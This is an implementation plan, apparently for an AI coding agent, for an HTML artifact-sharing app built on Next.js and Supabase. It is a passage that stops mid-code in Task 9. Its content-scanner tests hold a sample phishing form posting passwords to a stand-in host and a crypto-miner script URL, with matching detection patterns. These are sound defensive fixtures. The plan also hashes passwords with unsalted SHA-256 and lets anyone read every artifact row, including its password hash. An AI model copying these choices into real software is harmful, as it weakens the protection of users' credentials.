# ShareMyArtifact Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a zero-friction HTML artifact sharing platform where users upload HTML and get a shareable link that renders as a full web page.

**Architecture:** Next.js app with Supabase (auth, DB, storage) on Vercel. Two domains — `sharemyartifact.com` for the app, `smya.pub` for serving artifacts. Remote MCP server for AI-driven uploads. API routes handle all business logic.

**Tech Stack:** Next.js 15 (App Router), TypeScript, Supabase (Auth, Postgres, Storage), Tailwind CSS, shadcn/ui, Vitest, Vercel

---

### Task 1: Project Scaffolding

**Files:**
- Create: `package.json`, `tsconfig.json`, `next.config.ts`, `tailwind.config.ts`, `.env.local.example`, `.gitignore`
- Create: `src/app/layout.tsx`, `src/app/page.tsx`

**Step 1: Initialize Next.js project**

Run:
```bash
npx create-next-app@latest . --typescript --tailwind --eslint --app --src-dir --import-alias "@/*" --use-npm
```
Expected: Project scaffolded with App Router, TypeScript, Tailwind

**Step 2: Install core dependencies**

Run:
```bash
npm install @supabase/supabase-js @supabase/ssr
npm install -D vitest @testing-library/react @testing-library/jest-dom jsdom @vitejs/plugin-react
```

**Step 3: Create Vitest config**

Create: `vitest.config.ts`
```typescript
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  test: {
    environment: 'jsdom',
    setupFiles: ['./src/test/setup.ts'],
    globals: true,
  },
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
});
```

Create: `src/test/setup.ts`
```typescript
import '@testing-library/jest-dom/vitest';
```

**Step 4: Create environment variable template**

Create: `.env.local.example`
```
NEXT_PUBLIC_SUPABASE_URL=your-supabase-url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-supabase-anon-key
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
NEXT_PUBLIC_APP_URL=http://localhost:3000
NEXT_PUBLIC_ARTIFACT_URL=http://localhost:3001
```

**Step 5: Add test script to package.json**

Add to `scripts`:
```json
"test": "vitest",
"test:run": "vitest run"
```

**Step 6: Verify everything works**

Run: `npm run build && npm run test:run`
Expected: Build succeeds, test runner starts (0 tests)

**Step 7: Commit**

```bash
git add -A
git commit -m "chore: scaffold Next.js project with Vitest and Supabase deps"
```

---

### Task 2: Supabase Client Setup

**Files:**
- Create: `src/lib/supabase/client.ts`
- Create: `src/lib/supabase/server.ts`
- Create: `src/lib/supabase/middleware.ts`
- Test: `src/lib/supabase/__tests__/client.test.ts`

**Step 1: Write test for client-side Supabase client**

Create: `src/lib/supabase/__tests__/client.test.ts`
```typescript
import { describe, it, expect, vi } from 'vitest';

vi.stubEnv('NEXT_PUBLIC_SUPABASE_URL', 'https://test.supabase.co');
vi.stubEnv('NEXT_PUBLIC_SUPABASE_ANON_KEY', 'test-anon-key');

describe('createBrowserClient', () => {
  it('creates a Supabase client', async () => {
    const { createClient } = await import('../client');
    const client = createClient();
    expect(client).toBeDefined();
    expect(client.auth).toBeDefined();
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/supabase/__tests__/client.test.ts`
Expected: FAIL — module not found

**Step 3: Implement browser client**

Create: `src/lib/supabase/client.ts`
```typescript
import { createBrowserClient } from '@supabase/ssr';

export const createClient = () =>
  createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
```

**Step 4: Implement server client**

Create: `src/lib/supabase/server.ts`
```typescript
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

export const createClient = async () => {
  const cookieStore = await cookies();

  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll() {
          return cookieStore.getAll();
        },
        setAll(cookiesToSet) {
          try {
            cookiesToSet.forEach(({ name, value, options }) =>
              cookieStore.set(name, value, options)
            );
          } catch {
            // Called from Server Component — ignore
          }
        },
      },
    }
  );
};
```

**Step 5: Implement middleware helper**

Create: `src/lib/supabase/middleware.ts`
```typescript
import { createServerClient } from '@supabase/ssr';
import { NextResponse, type NextRequest } from 'next/server';

export const updateSession = async (request: NextRequest) => {
  let supabaseResponse = NextResponse.next({ request });

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll() {
          return request.cookies.getAll();
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) =>
            request.cookies.set(name, value)
          );
          supabaseResponse = NextResponse.next({ request });
          cookiesToSet.forEach(({ name, value, options }) =>
            supabaseResponse.cookies.set(name, value, options)
          );
        },
      },
    }
  );

  await supabase.auth.getUser();

  return supabaseResponse;
};
```

**Step 6: Run test to verify it passes**

Run: `npx vitest run src/lib/supabase/__tests__/client.test.ts`
Expected: PASS

**Step 7: Commit**

```bash
git add src/lib/supabase/
git commit -m "feat: add Supabase client setup (browser, server, middleware)"
```

---

### Task 3: Database Schema (Supabase Migrations)

**Files:**
- Create: `supabase/migrations/001_create_users.sql`
- Create: `supabase/migrations/002_create_artifacts.sql`
- Create: `supabase/migrations/003_create_api_keys.sql`

**Step 1: Create users table migration**

Create: `supabase/migrations/001_create_users.sql`
```sql
-- Public users table extending Supabase auth
create table public.users (
  id uuid references auth.users on delete cascade primary key,
  username text unique not null,
  created_at timestamptz default now() not null,

  constraint username_format check (username ~ '^[a-z0-9][a-z0-9_-]{2,29}$')
);

-- Enable RLS
alter table public.users enable row level security;

-- Anyone can read user profiles
create policy "Public profiles are viewable by everyone"
  on public.users for select using (true);

-- Users can only update their own profile
create policy "Users can update own profile"
  on public.users for update using (auth.uid() = id);

-- Index for username lookups
create unique index users_username_idx on public.users (username);
```

**Step 2: Create artifacts table migration**

Create: `supabase/migrations/002_create_artifacts.sql`
```sql
create type artifact_visibility as enum ('public', 'unlisted', 'password_protected');

create table public.artifacts (
  id uuid default gen_random_uuid() primary key,
  user_id uuid references public.users on delete cascade not null,
  slug text not null,
  title text not null,
  visibility artifact_visibility default 'unlisted' not null,
  password_hash text,
  storage_path text not null,
  file_size integer not null,
  view_count integer default 0 not null,
  last_accessed_at timestamptz,
  created_at timestamptz default now() not null,
  updated_at timestamptz default now() not null,

  constraint unique_user_slug unique (user_id, slug),
  constraint slug_format check (slug ~ '^[a-z0-9][a-z0-9_-]{0,99}$')
);

-- Enable RLS
alter table public.artifacts enable row level security;

-- Public/unlisted artifacts are viewable by everyone (for serving)
create policy "Artifacts are viewable by everyone"
  on public.artifacts for select using (true);

-- Users can insert their own artifacts
create policy "Users can insert own artifacts"
  on public.artifacts for insert with check (auth.uid() = user_id);

-- Users can update their own artifacts
create policy "Users can update own artifacts"
  on public.artifacts for update using (auth.uid() = user_id);

-- Users can delete their own artifacts
create policy "Users can delete own artifacts"
  on public.artifacts for delete using (auth.uid() = user_id);

-- Index for serving: lookup by username + slug
create index artifacts_user_slug_idx on public.artifacts (user_id, slug);

-- Index for profile pages: public artifacts by user
create index artifacts_public_idx on public.artifacts (user_id, created_at desc)
  where visibility = 'public';
```

**Step 3: Create API keys table migration**

Create: `supabase/migrations/003_create_api_keys.sql`
```sql
create table public.api_keys (
  id uuid default gen_random_uuid() primary key,
  user_id uuid references public.users on delete cascade not null,
  key_hash text not null,
  key_prefix text not null, -- first 8 chars for display (e.g. "sma_abc1...")
  name text not null,
  created_at timestamptz default now() not null,
  last_used_at timestamptz
);

-- Enable RLS
alter table public.api_keys enable row level security;

-- Users can only see their own API keys
create policy "Users can view own API keys"
  on public.api_keys for select using (auth.uid() = user_id);

-- Users can create their own API keys
create policy "Users can create own API keys"
  on public.api_keys for insert with check (auth.uid() = user_id);

-- Users can delete their own API keys
create policy "Users can delete own API keys"
  on public.api_keys for delete using (auth.uid() = user_id);

-- Index for API key lookup during authentication
create index api_keys_hash_idx on public.api_keys (key_hash);
```

**Step 4: Commit**

```bash
git add supabase/
git commit -m "feat: add database migrations for users, artifacts, and API keys"
```

---

### Task 4: TypeScript Types

**Files:**
- Create: `src/types/database.ts`
- Create: `src/types/api.ts`

**Step 1: Create database types**

Create: `src/types/database.ts`
```typescript
export type ArtifactVisibility = 'public' | 'unlisted' | 'password_protected';

export interface User {
  id: string;
  username: string;
  created_at: string;
}

export interface Artifact {
  id: string;
  user_id: string;
  slug: string;
  title: string;
  visibility: ArtifactVisibility;
  password_hash: string | null;
  storage_path: string;
  file_size: number;
  view_count: number;
  last_accessed_at: string | null;
  created_at: string;
  updated_at: string;
}

export interface ApiKey {
  id: string;
  user_id: string;
  key_hash: string;
  key_prefix: string;
  name: string;
  created_at: string;
  last_used_at: string | null;
}
```

**Step 2: Create API response types**

Create: `src/types/api.ts`
```typescript
import type { Artifact, ArtifactVisibility } from './database';

export interface UploadArtifactRequest {
  html: string;
  title?: string;
  slug?: string;
  visibility?: ArtifactVisibility;
  password?: string;
}

export interface UploadArtifactResponse {
  artifact: Artifact;
  url: string;
}

export interface UpdateArtifactRequest {
  html?: string;
  title?: string;
  slug?: string;
  visibility?: ArtifactVisibility;
  password?: string | null; // null to remove password
}

export interface ArtifactListItem {
  id: string;
  slug: string;
  title: string;
  visibility: ArtifactVisibility;
  view_count: number;
  created_at: string;
  updated_at: string;
  url: string;
}

export interface ApiErrorResponse {
  error: string;
  details?: string;
}
```

**Step 3: Commit**

```bash
git add src/types/
git commit -m "feat: add TypeScript types for database models and API contracts"
```

---

### Task 5: Title Extraction & Slug Utilities

**Files:**
- Create: `src/lib/extract-title.ts`
- Create: `src/lib/slugify.ts`
- Test: `src/lib/__tests__/extract-title.test.ts`
- Test: `src/lib/__tests__/slugify.test.ts`

**Step 1: Write tests for title extraction**

Create: `src/lib/__tests__/extract-title.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { extractTitle } from '../extract-title';

describe('extractTitle', () => {
  it('extracts title from <title> tag', () => {
    const html = '<html><head><title>My Dashboard</title></head><body></body></html>';
    expect(extractTitle(html)).toBe('My Dashboard');
  });

  it('falls back to first <h1> when no title tag', () => {
    const html = '<html><body><h1>Dashboard Overview</h1></body></html>';
    expect(extractTitle(html)).toBe('Dashboard Overview');
  });

  it('falls back to first <h1> when title is empty', () => {
    const html = '<html><head><title></title></head><body><h1>Fallback</h1></body></html>';
    expect(extractTitle(html)).toBe('Fallback');
  });

  it('returns null when no title or h1', () => {
    const html = '<html><body><p>Just a paragraph</p></body></html>';
    expect(extractTitle(html)).toBeNull();
  });

  it('trims whitespace from extracted title', () => {
    const html = '<html><head><title>  Spaced Out  </title></head></html>';
    expect(extractTitle(html)).toBe('Spaced Out');
  });

  it('handles multiline title tags', () => {
    const html = '<html><head><title>\n  Multi\n  Line\n</title></head></html>';
    expect(extractTitle(html)).toBe('Multi Line');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/extract-title.test.ts`
Expected: FAIL — module not found

**Step 3: Implement title extraction**

Create: `src/lib/extract-title.ts`
```typescript
export const extractTitle = (html: string): string | null => {
  // Try <title> tag first
  const titleMatch = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  if (titleMatch) {
    const title = titleMatch[1].replace(/\s+/g, ' ').trim();
    if (title) return title;
  }

  // Fall back to first <h1>
  const h1Match = html.match(/<h1[^>]*>([\s\S]*?)<\/h1>/i);
  if (h1Match) {
    // Strip any inner HTML tags
    const h1Text = h1Match[1].replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
    if (h1Text) return h1Text;
  }

  return null;
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/extract-title.test.ts`
Expected: PASS

**Step 5: Write tests for slugify**

Create: `src/lib/__tests__/slugify.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { slugify, generateTimestampSlug } from '../slugify';

describe('slugify', () => {
  it('converts title to URL-safe slug', () => {
    expect(slugify('My Cool Dashboard')).toBe('my-cool-dashboard');
  });

  it('removes special characters', () => {
    expect(slugify('Hello, World! (v2)')).toBe('hello-world-v2');
  });

  it('collapses multiple dashes', () => {
    expect(slugify('too---many---dashes')).toBe('too-many-dashes');
  });

  it('trims leading/trailing dashes', () => {
    expect(slugify('--trimmed--')).toBe('trimmed');
  });

  it('handles unicode by removing it', () => {
    expect(slugify('café dashboard')).toBe('caf-dashboard');
  });

  it('truncates to max length', () => {
    const long = 'a'.repeat(150);
    expect(slugify(long).length).toBeLessThanOrEqual(100);
  });
});

describe('generateTimestampSlug', () => {
  it('generates a slug from timestamp', () => {
    const slug = generateTimestampSlug();
    expect(slug).toMatch(/^artifact-\d+$/);
  });
});
```

**Step 6: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/slugify.test.ts`
Expected: FAIL — module not found

**Step 7: Implement slugify**

Create: `src/lib/slugify.ts`
```typescript
export const slugify = (text: string): string => {
  return text
    .toLowerCase()
    .replace(/[^a-z0-9\s-]/g, '')
    .replace(/\s+/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
    .slice(0, 100);
};

export const generateTimestampSlug = (): string => {
  return `artifact-${Date.now()}`;
};
```

**Step 8: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/slugify.test.ts`
Expected: PASS

**Step 9: Commit**

```bash
git add src/lib/extract-title.ts src/lib/slugify.ts src/lib/__tests__/
git commit -m "feat: add title extraction and slug generation utilities"
```

---

### Task 6: Content Scanner

**Files:**
- Create: `src/lib/content-scanner.ts`
- Test: `src/lib/__tests__/content-scanner.test.ts`

**Step 1: Write tests for content scanner**

Create: `src/lib/__tests__/content-scanner.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { scanContent } from '../content-scanner';

describe('scanContent', () => {
  it('passes clean HTML', () => {
    const html = '<html><body><h1>Hello</h1><script>fetch("/api/data")</script></body></html>';
    const result = scanContent(html);
    expect(result.safe).toBe(true);
    expect(result.flags).toHaveLength(0);
  });

  it('flags crypto miner scripts', () => {
    const html = '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
    const result = scanContent(html);
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('crypto_miner');
  });

  it('flags known phishing patterns', () => {
    const html = '<form action="https://evil.com/steal"><input name="password" type="password"><button>Login to Google</button></form>';
    const result = scanContent(html);
    expect(result.safe).toBe(false);
  });

  it('flags excessive base64 data (possible obfuscation)', () => {
    const bigBase64 = 'data:application/javascript;base64,' + 'A'.repeat(500000);
    const html = `<script src="${bigBase64}"></script>`;
    const result = scanContent(html);
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('suspicious_base64');
  });

  it('rejects files over size limit', () => {
    const result = scanContent('x', 6 * 1024 * 1024); // 6MB
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('file_too_large');
  });

  it('allows normal fetch usage', () => {
    const html = '<script>fetch("https://api.example.com/data").then(r => r.json())</script>';
    const result = scanContent(html);
    expect(result.safe).toBe(true);
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/content-scanner.test.ts`
Expected: FAIL

**Step 3: Implement content scanner**

Create: `src/lib/content-scanner.ts`
```typescript
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const CRYPTO_MINER_PATTERNS = [
  /coinhive/i,
  /cryptoloot/i,
  /coin-hive/i,
  /jsecoin/i,
  /cryptonight/i,
  /minero\.cc/i,
  /webminepool/i,
];

const PHISHING_PATTERNS = [
  /<form[^>]*action\s*=\s*["'][^"']*(?:steal|phish|harvest|capture)/i,
  /password.*(?:google|facebook|apple|microsoft|amazon|paypal).*(?:login|sign.?in)/is,
];

interface ScanResult {
  safe: boolean;
  flags: string[];
}

export const scanContent = (html: string, fileSize?: number): ScanResult => {
  const flags: string[] = [];
  const size = fileSize ?? new Blob([html]).size;

  if (size > MAX_FILE_SIZE) {
    flags.push('file_too_large');
  }

  for (const pattern of CRYPTO_MINER_PATTERNS) {
    if (pattern.test(html)) {
      flags.push('crypto_miner');
      break;
    }
  }

  for (const pattern of PHISHING_PATTERNS) {
    if (pattern.test(html)) {
      flags.push('phishing_pattern');
      break;
    }
  }

  // Large base64 blobs (>100KB) may indicate obfuscated payloads
  const base64Matches = html.match(/base64,[A-Za-z0-9+/=]{100000,}/g);
  if (base64Matches) {
    flags.push('suspicious_base64');
  }

  return {
    safe: flags.length === 0,
    flags,
  };
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/content-scanner.test.ts`
Expected: PASS

**Step 5: Commit**

```bash
git add src/lib/content-scanner.ts src/lib/__tests__/content-scanner.test.ts
git commit -m "feat: add basic content scanner for upload validation"
```

---

### Task 7: Auth — Signup with Username, Login, OAuth

**Files:**
- Create: `src/app/auth/signup/page.tsx`
- Create: `src/app/auth/login/page.tsx`
- Create: `src/app/auth/callback/route.ts`
- Create: `src/app/auth/username/page.tsx`
- Create: `src/lib/auth.ts`
- Create: `src/middleware.ts`
- Test: `src/lib/__tests__/auth.test.ts`

**Step 1: Write tests for auth helpers**

Create: `src/lib/__tests__/auth.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { isValidUsername } from '../auth';

describe('isValidUsername', () => {
  it('accepts valid usernames', () => {
    expect(isValidUsername('john')).toBe(true);
    expect(isValidUsername('jane-doe')).toBe(true);
    expect(isValidUsername('user_123')).toBe(true);
    expect(isValidUsername('a1b')).toBe(true);
  });

  it('rejects too short', () => {
    expect(isValidUsername('ab')).toBe(false);
  });

  it('rejects too long', () => {
    expect(isValidUsername('a'.repeat(31))).toBe(false);
  });

  it('rejects uppercase', () => {
    expect(isValidUsername('John')).toBe(false);
  });

  it('rejects special characters', () => {
    expect(isValidUsername('user@name')).toBe(false);
    expect(isValidUsername('user.name')).toBe(false);
  });

  it('rejects starting with dash or underscore', () => {
    expect(isValidUsername('-user')).toBe(false);
    expect(isValidUsername('_user')).toBe(false);
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/auth.test.ts`
Expected: FAIL

**Step 3: Implement auth helpers**

Create: `src/lib/auth.ts`
```typescript
const USERNAME_REGEX = /^[a-z0-9][a-z0-9_-]{2,29}$/;

export const isValidUsername = (username: string): boolean => {
  return USERNAME_REGEX.test(username);
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/auth.test.ts`
Expected: PASS

**Step 5: Create Next.js middleware for domain routing + auth**

Create: `src/middleware.ts`
```typescript
import { type NextRequest, NextResponse } from 'next/server';
import { updateSession } from '@/lib/supabase/middleware';

const ARTIFACT_DOMAIN = process.env.NEXT_PUBLIC_ARTIFACT_DOMAIN || 'smya.pub';

export const middleware = async (request: NextRequest) => {
  const hostname = request.headers.get('host') || '';

  // Route artifact domain requests to artifact serving
  if (hostname.includes(ARTIFACT_DOMAIN)) {
    const path = request.nextUrl.pathname;
    // Rewrite to artifact serving route
    return NextResponse.rewrite(
      new URL(`/api/serve${path}`, request.url)
    );
  }

  // Main domain: refresh auth session
  return await updateSession(request);
};

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
  ],
};
```

**Step 6: Create OAuth callback route**

Create: `src/app/auth/callback/route.ts`
```typescript
import { createClient } from '@/lib/supabase/server';
import { NextResponse } from 'next/server';

export const GET = async (request: Request) => {
  const { searchParams, origin } = new URL(request.url);
  const code = searchParams.get('code');
  const next = searchParams.get('next') ?? '/dashboard';

  if (code) {
    const supabase = await createClient();
    const { error } = await supabase.auth.exchangeCodeForSession(code);

    if (!error) {
      // Check if user has a username set
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: profile } = await supabase
          .from('users')
          .select('username')
          .eq('id', user.id)
          .single();

        if (!profile) {
          // New user — needs to pick a username
          return NextResponse.redirect(`${origin}/auth/username`);
        }
      }

      return NextResponse.redirect(`${origin}${next}`);
    }
  }

  return NextResponse.redirect(`${origin}/auth/login?error=auth_failed`);
};
```

**Step 7: Create auth pages (signup, login, username selection)**

These pages will be implemented with the frontend-design skill during the UI tasks.
For now, create placeholder pages:

Create: `src/app/auth/signup/page.tsx`
```typescript
export default function SignupPage() {
  return <div>Signup — to be designed</div>;
}
```

Create: `src/app/auth/login/page.tsx`
```typescript
export default function LoginPage() {
  return <div>Login — to be designed</div>;
}
```

Create: `src/app/auth/username/page.tsx`
```typescript
export default function UsernamePage() {
  return <div>Choose username — to be designed</div>;
}
```

**Step 8: Commit**

```bash
git add src/lib/auth.ts src/lib/__tests__/auth.test.ts src/middleware.ts src/app/auth/
git commit -m "feat: add auth helpers, middleware with domain routing, OAuth callback"
```

---

### Task 8: API — Upload Artifact

**Files:**
- Create: `src/app/api/artifacts/route.ts`
- Test: `src/app/api/artifacts/__tests__/upload.test.ts`

**Step 1: Write tests for upload logic**

Create: `src/lib/__tests__/artifact-service.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { processUpload } from '../artifact-service';

describe('processUpload', () => {
  it('extracts title and generates slug from HTML', () => {
    const html = '<html><head><title>Sales Dashboard</title></head><body></body></html>';
    const result = processUpload(html);
    expect(result.title).toBe('Sales Dashboard');
    expect(result.slug).toBe('sales-dashboard');
  });

  it('uses provided title over extracted one', () => {
    const html = '<html><head><title>Original</title></head></html>';
    const result = processUpload(html, { title: 'Custom Title' });
    expect(result.title).toBe('Custom Title');
    expect(result.slug).toBe('custom-title');
  });

  it('uses provided slug over generated one', () => {
    const html = '<html><head><title>Dashboard</title></head></html>';
    const result = processUpload(html, { slug: 'my-slug' });
    expect(result.slug).toBe('my-slug');
  });

  it('generates timestamp slug when no title found', () => {
    const html = '<html><body><p>No title here</p></body></html>';
    const result = processUpload(html);
    expect(result.slug).toMatch(/^artifact-\d+$/);
    expect(result.title).toMatch(/^artifact-\d+$/);
  });

  it('rejects unsafe content', () => {
    const html = '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
    expect(() => processUpload(html)).toThrow('Content flagged');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/artifact-service.test.ts`
Expected: FAIL

**Step 3: Implement artifact service**

Create: `src/lib/artifact-service.ts`
```typescript
import { extractTitle } from './extract-title';
import { slugify, generateTimestampSlug } from './slugify';
import { scanContent } from './content-scanner';

interface ProcessUploadOptions {
  title?: string;
  slug?: string;
}

interface ProcessedUpload {
  title: string;
  slug: string;
  html: string;
}

export const processUpload = (
  html: string,
  options?: ProcessUploadOptions
): ProcessedUpload => {
  // Scan content
  const scanResult = scanContent(html);
  if (!scanResult.safe) {
    throw new Error(`Content flagged: ${scanResult.flags.join(', ')}`);
  }

  // Determine title
  const extractedTitle = extractTitle(html);
  const title = options?.title || extractedTitle || generateTimestampSlug();

  // Determine slug
  const slug = options?.slug || slugify(title) || generateTimestampSlug();

  return { title, slug, html };
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/artifact-service.test.ts`
Expected: PASS

**Step 5: Implement upload API route**

Create: `src/app/api/artifacts/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase/server';
import { processUpload } from '@/lib/artifact-service';
import type { UploadArtifactRequest, UploadArtifactResponse, ApiErrorResponse } from '@/types/api';

const ARTIFACT_URL = process.env.NEXT_PUBLIC_ARTIFACT_URL || 'https://smya.pub';

export const POST = async (request: NextRequest) => {
  const supabase = await createClient();

  const { data: { user }, error: authError } = await supabase.auth.getUser();
  if (authError || !user) {
    return NextResponse.json<ApiErrorResponse>(
      { error: 'Unauthorized' },
      { status: 401 }
    );
  }

  // Get username
  const { data: profile } = await supabase
    .from('users')
    .select('username')
    .eq('id', user.id)
    .single();

  if (!profile) {
    return NextResponse.json<ApiErrorResponse>(
      { error: 'Username not set' },
      { status: 400 }
    );
  }

  try {
    const body: UploadArtifactRequest = await request.json();

    if (!body.html) {
      return NextResponse.json<ApiErrorResponse>(
        { error: 'HTML content is required' },
        { status: 400 }
      );
    }

    const processed = processUpload(body.html, {
      title: body.title,
      slug: body.slug,
    });

    // Store HTML in Supabase Storage
    const storagePath = `${user.id}/${processed.slug}.html`;
    const { error: storageError } = await supabase.storage
      .from('artifacts')
      .upload(storagePath, body.html, {
        contentType: 'text/html',
        upsert: false,
      });

    if (storageError) {
      return NextResponse.json<ApiErrorResponse>(
        { error: 'Storage upload failed', details: storageError.message },
        { status: 500 }
      );
    }

    // Hash password if provided
    let passwordHash: string | null = null;
    if (body.password) {
      const encoder = new TextEncoder();
      const data = encoder.encode(body.password);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      passwordHash = Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
    }

    // Create artifact record
    const { data: artifact, error: dbError } = await supabase
      .from('artifacts')
      .insert({
        user_id: user.id,
        slug: processed.slug,
        title: processed.title,
        visibility: body.visibility || (body.password ? 'password_protected' : 'unlisted'),
        password_hash: passwordHash,
        storage_path: storagePath,
        file_size: new Blob([body.html]).size,
      })
      .select()
      .single();

    if (dbError) {
      // Clean up storage on DB failure
      await supabase.storage.from('artifacts').remove([storagePath]);
      return NextResponse.json<ApiErrorResponse>(
        { error: 'Failed to create artifact', details: dbError.message },
        { status: 500 }
      );
    }

    const url = `${ARTIFACT_URL}/${profile.username}/${processed.slug}.html`;

    return NextResponse.json<UploadArtifactResponse>(
      { artifact, url },
      { status: 201 }
    );
  } catch (err) {
    const message = err instanceof Error ? err.message : 'Unknown error';
    return NextResponse.json<ApiErrorResponse>(
      { error: message },
      { status: 400 }
    );
  }
};

export const GET = async () => {
  const supabase = await createClient();

  const { data: { user }, error: authError } = await supabase.auth.getUser();
  if (authError || !user) {
    return NextResponse.json<ApiErrorResponse>(
      { error: 'Unauthorized' },
      { status: 401 }
    );
  }

  const { data: profile } = await supabase
    .from('users')
    .select('username')
    .eq('id', user.id)
    .single();

  const { data: artifacts, error } = await supabase
    .from('artifacts')
    .select('id, slug, title, visibility, view_count, created_at, updated_at')
    .eq('user_id', user.id)
    .order('created_at', { ascending: false });

  if (error) {
    return NextResponse.json<ApiErrorResponse>(
      { error: 'Failed to list artifacts' },
      { status: 500 }
    );
  }

  const ARTIFACT_BASE = process.env.NEXT_PUBLIC_ARTIFACT_URL || 'https://smya.pub';
  const items = (artifacts || []).map(a => ({
    ...a,
    url: `${ARTIFACT_BASE}/${profile?.username}/${a.slug}.html`,
  }));

  return NextResponse.json(items);
};
```

**Step 6: Commit**

```bash
git add src/lib/artifact-service.ts src/lib/__tests__/artifact-service.test.ts src/app/api/artifacts/
git commit -m "feat: add artifact upload/list API routes with content processing"
```

---

### Task 9: API — Update & Delete Artifact

**Files:**
- Create: `src/app/api/artifacts/[slug]/route.ts`

**Step 1: Implement single-artifact API routes**

Create: `src/app/api/artifacts/[slug]/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase/server';
import { processUpload } from '@/lib/artifact-service';
import type { UpdateArtifactRequest, ApiErrorResponse } from '@/types/api';

const ARTIFACT_URL = process.env.NEXT_PUBLIC_ARTIFACT_URL || 'https://smya.pub';

export const GET = async (
  _request: NextRequest,
  { params }: { params: Promise<{ slug: string }> }
) => {
  const { slug } = await params;
  const supabase = await createClient();

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Unauthorized' }, { status: 401 });
  }

  const { data: artifact, error } = await supabase
    .from('artifacts')
    .select('*')
    .eq('user_id', user.id)
    .eq('slug', slug)
    .single();

  if (error || !artifact) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Not found' }, { status: 404 });
  }

  return NextResponse.json(artifact);
};

export const PUT = async (
  request: NextRequest,
  { params }: { params: Promise<{ slug: string }> }
) => {
  const { slug } = await params;
  const supabase = await createClient();

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Unauthorized' }, { status: 401 });
  }

  const { data: existing } = await supabase
    .from('artifacts')
    .select('*')
    .eq('user_id', user.id)
    .eq('slug', slug)
    .single();

  if (!existing) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Not found' }, { status: 404 });
  }

  const body: UpdateArtifactRequest = await request.json();
  const updates: Record<string, unknown> = { updated_at: new Date().toISOString() };

  // Update HTML if provided
  if (body.html) {
    const processed = processUpload(body.html);
    const storagePath = existing.storage_path;

    const { error: storageError } = await supabase.storage
      .from('artifacts')
      .update(storagePath, body.html, { contentType: 'text/html' });

    if (storageError) {
      return NextResponse.json<ApiErrorResponse>(
        { error: 'Storage update failed' },
        { status: 500 }
      );
    }
    updates.file_size = new Blob([body.html]).size;
  }

  if (body.title) updates.title = body.title;
  if (body.visibility) updates.visibility = body.visibility;

  // Handle slug change
  if (body.slug && body.slug !== slug) {
    updates.slug = body.slug;
    // Rename file in storage
    const newPath = `${user.id}/${body.slug}.html`;
    const { data: fileData } = await supabase.storage
      .from('artifacts')
      .download(existing.storage_path);
    if (fileData) {
      await supabase.storage.from('artifacts').upload(newPath, fileData, { contentType: 'text/html' });
      await supabase.storage.from('artifacts').remove([existing.storage_path]);
      updates.storage_path = newPath;
    }
  }

  // Handle password
  if (body.password !== undefined) {
    if (body.password === null) {
      updates.password_hash = null;
      if (!body.visibility) updates.visibility = 'unlisted';
    } else {
      const encoder = new TextEncoder();
      const data = encoder.encode(body.password);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      updates.password_hash = Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
      if (!body.visibility) updates.visibility = 'password_protected';
    }
  }

  const { data: updated, error } = await supabase
